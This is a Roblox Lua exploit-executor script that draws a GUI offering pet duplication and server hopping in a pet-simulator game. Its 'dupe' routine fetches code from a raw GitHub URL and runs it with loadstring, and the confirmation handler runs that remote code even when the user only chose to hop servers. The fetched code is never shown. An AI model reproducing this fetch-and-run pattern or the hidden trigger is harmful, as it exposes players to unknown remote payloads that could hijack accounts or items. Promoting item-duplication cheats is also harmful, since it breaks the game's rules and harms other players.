-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "PetSimGui"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 350)
frame.Position = UDim2.new(0.5, -225, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Visible = false
frame.Parent = gui

-- Floating Icon Toggle Button
local toggleButton = Instance.new("ImageButton")
toggleButton.Size = UDim2.new(0, 50, 0, 50)
toggleButton.Position = UDim2.new(1, -60, 0, 10)
toggleButton.BackgroundTransparency = 1
toggleButton.Image = "rbxthumb://type=Asset&id=136388825215109&w=150&h=150"
toggleButton.Parent = gui
toggleButton.Active = true
toggleButton.Draggable = true

toggleButton.MouseButton1Click:Connect(function()
	frame.Visible = not frame.Visible
end)

-- Icon
local icon = Instance.new("ImageLabel")
icon.Size = UDim2.new(0, 50, 0, 50)
icon.Position = UDim2.new(0, 10, 0, 10)
icon.BackgroundTransparency = 1
icon.Image = "rbxthumb://type=Asset&id=136388825215109&w=150&h=150"
icon.Parent = frame

-- RGB LED Border for Icon
local stroke = Instance.new("UIStroke")
stroke.Thickness = 3
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Parent = icon

task.spawn(function()
	while true do
		for hue = 0, 1, 0.01 do
			stroke.Color = Color3.fromHSV(hue, 1, 1)
			task.wait(0.05)
		end
	end
end)

-- Dupe Pet Button
local dupeButton = Instance.new("TextButton")
dupeButton.Size = UDim2.new(0, 250, 0, 50)
dupeButton.Position = UDim2.new(0.5, -125, 0, 80)
dupeButton.Text = "Dupe Pet [Need Alt Account!]"
dupeButton.TextWrapped = true
dupeButton.TextScaled = true
dupeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
dupeButton.Parent = frame

-- Hop Server Button
local hopButton = Instance.new("TextButton")
hopButton.Size = UDim2.new(0, 250, 0, 50)
hopButton.Position = UDim2.new(0.5, -125, 0, 150)
hopButton.Text = "Hop Server!"
hopButton.TextScaled = true
hopButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
hopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
hopButton.Parent = frame

-- Confirmation UI
local confirmFrame = Instance.new("Frame")
confirmFrame.Size = UDim2.new(0, 300, 0, 150)
confirmFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
confirmFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
confirmFrame.BorderSizePixel = 0
confirmFrame.Visible = false
confirmFrame.Parent = gui

local confirmText = Instance.new("TextLabel")
confirmText.Size = UDim2.new(1, -20, 0, 60)
confirmText.Position = UDim2.new(0, 10, 0, 10)
confirmText.TextWrapped = true
confirmText.TextScaled = true
confirmText.BackgroundTransparency = 1
confirmText.TextColor3 = Color3.fromRGB(255, 255, 255)
confirmText.Parent = confirmFrame

local yesBtn = Instance.new("TextButton")
yesBtn.Size = UDim2.new(0, 100, 0, 40)
yesBtn.Position = UDim2.new(0, 30, 1, -50)
yesBtn.Text = "Yes"
yesBtn.TextSize = 18
yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
yesBtn.Parent = confirmFrame

local noBtn = Instance.new("TextButton")
noBtn.Size = UDim2.new(0, 100, 0, 40)
noBtn.Position = UDim2.new(1, -130, 1, -50)
noBtn.Text = "No"
noBtn.TextSize = 18
noBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
noBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
noBtn.Parent = confirmFrame

-- Confirmation logic
local actionType = nil

local function runDupeScript()
	game.StarterGui:SetCore("SendNotification", {
		Title = "Please Wait!",
		Text = "Running Dupe Script...",
		Duration = 3
	})
	wait(2)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MagzTVT/Pet-simulator-Dupe-script/refs/heads/main/Script"))()
end

local function hopServer()
	local servers = {}
	local req = syn and syn.request or http and http.request or http_request
	local gameId = game.PlaceId
	local cursor = ""
	local found = false

	while not found do
		local response = req({
			Url = "https://games.roblox.com/v1/games/" .. gameId .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. cursor
		})
		local data = HttpService:JSONDecode(response.Body)
		for _, server in ipairs(data.data) do
			if server.id ~= game.JobId and server.playing < server.maxPlayers then
				TeleportService:TeleportToPlaceInstance(gameId, server.id)
				found = true
				break
			end
		end
		cursor = data.nextPageCursor or ""
		if cursor == "" then break end
	end
end

yesBtn.MouseButton1Click:Connect(function()
	confirmFrame.Visible = false
	runDupeScript()
	if actionType == "hop" then
		wait(1)
		hopServer()
	end
end)

noBtn.MouseButton1Click:Connect(function()
	confirmFrame.Visible = false
	game.StarterGui:SetCore("SendNotification", {
		Title = "Okay!",
		Text = "Oh, then I'm not gonna do anything.",
		Duration = 3
	})
end)

-- Triggers
dupeButton.MouseButton1Click:Connect(function()
	actionType = "dupe"
	confirmText.Text = "Are you sure you want to open Dupe Pet?"
	confirmFrame.Visible = true
end)

hopButton.MouseButton1Click:Connect(function()
	actionType = "hop"
	confirmText.Text = "Are you sure you want to Hop Servers?"
	confirmFrame.Visible = true
end)